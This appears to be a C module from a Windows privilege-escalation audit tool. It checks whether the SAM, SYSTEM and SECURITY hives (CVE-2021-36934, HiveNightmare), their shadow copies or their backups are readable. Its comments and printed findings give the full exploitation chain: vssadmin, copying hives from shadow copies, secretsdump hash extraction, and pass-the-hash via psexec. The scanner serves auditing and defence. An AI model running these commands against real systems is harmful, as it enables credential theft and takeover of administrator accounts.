/*
 * hive_nightmare.c — HiveNightmare / SeriousSam (CVE-2021-36934) & SAM Access
 *
 * CVE-2021-36934 — CVSS 7.8 HIGH — Disclosed July 2021
 *
 * WHAT IT IS:
 *   Windows 10 v1809+ (October 2018 Update) and later have excessively permissive
 *   ACLs on registry hive files in C:\Windows\System32\config\:
 *     SAM     — Security Account Manager (local account hashes)
 *     SYSTEM  — System hive (Boot Key / SYSKEY used to decrypt SAM)
 *     SECURITY — LSA secrets, service account credentials
 *
 *   BUILTINUsers (S-1-5-32-545) has READ access to these files since Windows 10 v1809.
 *   Any standard user can read the SAM, SYSTEM, and SECURITY hives directly.
 *   This means password hashes for ALL local accounts are readable by any user.
 *
 * EXPLOITATION:
 *   The live hive files are locked by the kernel (volume shadow copy needed to read them
 *   while Windows is running). Shadow copies (VSS) are created automatically by Windows:
 *   - On Windows 10: System Restore points, Windows Update, feature updates
 *   - On Windows Server: created by backup software
 *
 *   Step 1: List shadow copies with volume access
 *     vssadmin list shadows
 *     OR: (Get-WmiObject Win32_ShadowCopy).DeviceObject
 *
 *   Step 2: Access SAM from shadow copy
 *     copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Windows\System32\config\SAM C:\temp\
 *     copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Windows\System32\config\SYSTEM C:\temp\
 *     copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Windows\System32\config\SECURITY C:\temp\
 *
 *   Step 3: Extract hashes (offline, from attacker machine)
 *     secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
 *     → Dumps local account NTLM hashes
 *
 *   Step 4: Pass-the-hash / crack
 *     psexec.py Administrator@target -hashes :<NT_HASH>
 *
 * IMPACT:
 *   - Any local user → read local Administrator hash → PtH → SYSTEM
 *   - Any local user → read SECURITY hive → LSA secrets → service account creds
 *   - Affects Windows 10 1809 through 21H1 (patched in July 2021 Patch Tuesday)
 *   - Some systems remain unpatched or shadow copies exist from pre-patch era
 *
 * WHAT THIS MODULE CHECKS:
 *   1. Direct readability of SAM/SYSTEM/SECURITY hive files by current user
 *   2. Volume Shadow Copy enumeration and SAM readability from shadow copies
 *   3. ACL on the config directory itself
 *   4. HiveCrashDump residuals (sometimes hive fragments written to writable paths)
 *
 * REFERENCES:
 *   CVE-2021-36934: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934
 *   KB5005010: Microsoft patch
 *   jonasLyk discovery: https://twitter.com/jonasLyk/status/1417205166172950531
 *   SecureAuth HiveNightmare PoC: https://github.com/GossiTheDog/HiveNightmare
 *   Impacket secretsdump: https://github.com/fortra/impacket
 */

#include "../common.h"
#include <aclapi.h>

/* -----------------------------------------------------------------------
 * Check if a file is readable by current user via direct access attempt
 * --------------------------------------------------------------------- */
static BOOL IsFileReadableByUser(LPCWSTR path) {
    HANDLE h = CreateFileW(path, GENERIC_READ,
                           FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                           NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        CloseHandle(h);
        return TRUE;
    }
    return FALSE;
}

/* -----------------------------------------------------------------------
 * Check SAM/SYSTEM/SECURITY hive readability (CVE-2021-36934)
 * --------------------------------------------------------------------- */
static void AuditHiveReadability(DWORD *findings) {
    PrintInfo(L"  [1] SAM/SYSTEM/SECURITY hive readability (CVE-2021-36934 HiveNightmare):\n");

    wchar_t sysDir[MAX_PATH] = {0};
    GetSystemDirectoryW(sysDir, _countof(sysDir));

    static const struct {
        const wchar_t *name;
        const wchar_t *description;
        DWORD          severity;
    } HIVES[] = {
        { L"SAM",      L"Local account NTLM hashes",              SEV_CRITICAL },
        { L"SYSTEM",   L"Boot key (SYSKEY) — needed to decrypt SAM", SEV_CRITICAL },
        { L"SECURITY", L"LSA secrets, cached domain creds",       SEV_CRITICAL },
        { NULL, NULL, 0 }
    };

    DWORD vulnerable = 0;

    for (int i = 0; HIVES[i].name; i++) {
        wchar_t hivePath[MAX_PATH * 2] = {0};
        _snwprintf(hivePath, _countof(hivePath), L"%s\\config\\%s", sysDir, HIVES[i].name);

        BOOL exists   = (GetFileAttributesW(hivePath) != INVALID_FILE_ATTRIBUTES);
        BOOL readable = exists && IsFileReadableByUser(hivePath);

        PrintInfo(L"    %s%-8s: %s%s\n",
                  readable ? L"[!] " : L"    ",
                  HIVES[i].name, hivePath,
                  !exists ? L" [NOT FOUND]" :
                  readable ? L" [READABLE — VULNERABLE to CVE-2021-36934!]" : L" [not directly readable]");

        if (readable) {
            vulnerable++;
            Finding f;
            f.severity = HIVES[i].severity;
            wcscpy(f.module, L"HIVENIGHTMARE");
            _snwprintf(f.target, _countof(f.target),
                L"[CVE-2021-36934] %s hive is READABLE: %s", HIVES[i].name, hivePath);
            _snwprintf(f.reason, _countof(f.reason),
                L"HiveNightmare (CVE-2021-36934): %s hive file is readable by current user!\n"
                L"        Contains: %s\n"
                L"        Live file is NTFS-locked, but shadow copies are accessible.\n"
                L"        Exploit:\n"
                L"          vssadmin list shadows\n"
                L"          copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\"
                L"Windows\\System32\\config\\%s C:\\Temp\\\n"
                L"          secretsdump.py -sam SAM -system SYSTEM LOCAL\n"
                L"          psexec.py Admin@target -hashes :<NTLM_HASH>",
                HIVES[i].name, HIVES[i].description, HIVES[i].name);
            PrintFinding(&f);
            (*findings)++;
        }
    }

    /* Check config directory ACL */
    wchar_t configDir[MAX_PATH * 2] = {0};
    _snwprintf(configDir, _countof(configDir), L"%s\\config", sysDir);

    SECURITY_DESCRIPTOR *pSD = NULL;
    DWORD sdSize = 0;
    GetFileSecurityW(configDir, DACL_SECURITY_INFORMATION,
                     NULL, 0, &sdSize);
    if (sdSize > 0) {
        pSD = (SECURITY_DESCRIPTOR *)HeapAlloc(GetProcessHeap(), 0, sdSize);
        if (pSD) {
            if (GetFileSecurityW(configDir, DACL_SECURITY_INFORMATION,
                                 pSD, sdSize, &sdSize)) {
                /* Convert to string to check for Users SID */
                LPWSTR sddl = NULL;
                if (ConvertSecurityDescriptorToStringSecurityDescriptorW(
                        pSD, SDDL_REVISION_1, DACL_SECURITY_INFORMATION, &sddl, NULL)) {
                    /* Look for BU (Builtin Users) with read access */
                    if (sddl && WcsContainsI(sddl, L"BU")) {
                        PrintInfo(L"    [!] config\\ ACL contains Builtin\\Users entry\n");
                    }
                    if (sddl) LocalFree(sddl);
                }
            }
            HeapFree(GetProcessHeap(), 0, pSD);
        }
    }

    if (vulnerable == 0)
        PrintInfo(L"    Hive files not directly readable (good — either patched or locked)\n");
    PrintInfo(L"\n");
}

/* -----------------------------------------------------------------------
 * Enumerate Volume Shadow Copies and test SAM readability
 * --------------------------------------------------------------------- */
static void AuditShadowCopySAM(DWORD *findings) {
    PrintInfo(L"  [2] Volume Shadow Copy SAM access:\n");

    wchar_t sysDir[MAX_PATH] = {0};
    GetSystemDirectoryW(sysDir, _countof(sysDir));

    /* Extract drive letter */
    wchar_t drive[4] = {sysDir[0], L':', L'\\', 0};

    /* Enumerate shadow copies via device path probing */
    DWORD foundShadows = 0;
    BOOL  foundVulnerable = FALSE;

    for (int shadowIdx = 1; shadowIdx <= 64; shadowIdx++) {
        wchar_t shadowPath[512];
        _snwprintf(shadowPath, _countof(shadowPath),
                   L"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy%d", shadowIdx);

        wchar_t samPath[MAX_PATH * 2];
        _snwprintf(samPath, _countof(samPath),
                   L"%s\\Windows\\System32\\config\\SAM", shadowPath);

        DWORD attrs = GetFileAttributesW(samPath);
        if (attrs == INVALID_FILE_ATTRIBUTES) continue;

        foundShadows++;
        BOOL readable = IsFileReadableByUser(samPath);
        PrintInfo(L"    ShadowCopy%02d: %s %s\n",
                  shadowIdx, samPath,
                  readable ? L"[SAM READABLE!]" : L"[not readable]");

        if (readable && !foundVulnerable) {
            foundVulnerable = TRUE;
            Finding f;
            f.severity = SEV_CRITICAL;
            wcscpy(f.module, L"HIVENIGHTMARE");
            _snwprintf(f.target, _countof(f.target),
                L"[SHADOW COPY SAM] HarddiskVolumeShadowCopy%d — SAM readable!", shadowIdx);
            _snwprintf(f.reason, _countof(f.reason),
                L"SAM hive is readable from Volume Shadow Copy %d.\n"
                L"        Exploitation commands:\n"
                L"          copy \"%s\" C:\\Temp\\SAM\n"
                L"          copy \"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy%d"
                L"\\Windows\\System32\\config\\SYSTEM\" C:\\Temp\\SYSTEM\n"
                L"          [On attacker machine]: secretsdump.py -sam SAM -system SYSTEM LOCAL\n"
                L"          [Pass-the-hash]: psexec.py Administrator@%s -hashes :<NTLM>",
                shadowIdx, samPath, shadowIdx, drive);
            PrintFinding(&f);
            (*findings)++;
        }
    }

    if (foundShadows == 0)
        PrintInfo(L"    No Volume Shadow Copies found (no restore points created)\n");
    else if (!foundVulnerable)
        PrintInfo(L"    Shadow copies found but SAM not readable (patched or access denied)\n");
    PrintInfo(L"\n");
}

/* -----------------------------------------------------------------------
 * Check SAM/SYSTEM hive backup copies in temp locations
 * --------------------------------------------------------------------- */
static void AuditHiveBackups(DWORD *findings) {
    PrintInfo(L"  [3] SAM hive backups and copies:\n");

    wchar_t sysDir[MAX_PATH] = {0};
    GetSystemDirectoryW(sysDir, _countof(sysDir));

    static const wchar_t *BACKUP_PATHS[] = {
        L"%SystemRoot%\\repair\\SAM",
        L"%SystemRoot%\\repair\\SECURITY",
        L"%SystemRoot%\\repair\\system",
        L"%SystemRoot%\\System32\\config\\RegBack\\SAM",
        L"%SystemRoot%\\System32\\config\\RegBack\\SYSTEM",
        L"%SystemRoot%\\System32\\config\\RegBack\\SECURITY",
        NULL
    };

    DWORD found = 0;
    for (int i = 0; BACKUP_PATHS[i]; i++) {
        wchar_t expanded[MAX_PATH * 2] = {0};
        ExpandEnvironmentStringsW(BACKUP_PATHS[i], expanded, _countof(expanded));

        DWORD attrs = GetFileAttributesW(expanded);
        if (attrs == INVALID_FILE_ATTRIBUTES) continue;

        found++;
        BOOL readable = IsFileReadableByUser(expanded);

        PrintInfo(L"    %-60s %s\n",
                  expanded,
                  readable ? L"[READABLE!]" : L"[not readable]");

        if (readable) {
            Finding f;
            f.severity = SEV_HIGH;
            wcscpy(f.module, L"HIVENIGHTMARE");
            _snwprintf(f.target, _countof(f.target),
                L"[READABLE HIVE BACKUP] %s", expanded);
            _snwprintf(f.reason, _countof(f.reason),
                L"SAM/SYSTEM hive backup copy is readable: %s\n"
                L"        Backup hives may contain older password hashes.\n"
                L"        Can be used with secretsdump.py for offline hash extraction.\n"
                L"        These RegBack copies are created by Windows automatically.",
                expanded);
            PrintFinding(&f);
            (*findings)++;
        }
    }
    if (found == 0) PrintInfo(L"    No backup hive files found\n");
    PrintInfo(L"\n");
}

void Module_HiveNightmare(void) {
    PrintHeader(L"HIVENIGHTMARE (CVE-2021-36934)  [SAM/SYSTEM/SECURITY hive readability — local hash extraction]");

    PrintInfo(
        L"  CVE-2021-36934: Windows 10 1809+ allows standard users to read SAM hive.\n"
        L"  With shadow copies, any user can extract local account NTLM hashes.\n"
        L"  Local Admin hash → Pass-the-Hash → SYSTEM. No exploit binary needed.\n\n");

    DWORD findings = 0;
    AuditHiveReadability(&findings);
    AuditShadowCopySAM(&findings);
    AuditHiveBackups(&findings);

    if (findings == 0)
        PrintInfo(L"  No HiveNightmare surface found (patched or no shadow copies).\n");
    else {
        PrintInfo(L"  Total findings: %lu\n\n", findings);
        PrintInfo(
            L"  FULL EXPLOITATION CHAIN:\n"
            L"    1. List shadow copies:\n"
            L"       vssadmin list shadows\n"
            L"       wmic shadowcopy get DeviceObject,VolumeName\n"
            L"    2. Copy hives from shadow copy:\n"
            L"       copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM C:\\Temp\\\n"
            L"       copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\Temp\\\n"
            L"       copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SECURITY C:\\Temp\\\n"
            L"    3. Extract hashes (on attacker machine):\n"
            L"       python3 secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL\n"
            L"    4. Pass-the-hash:\n"
            L"       python3 psexec.py Administrator@<IP> -hashes :<NTLM_HASH>\n");
    }
}
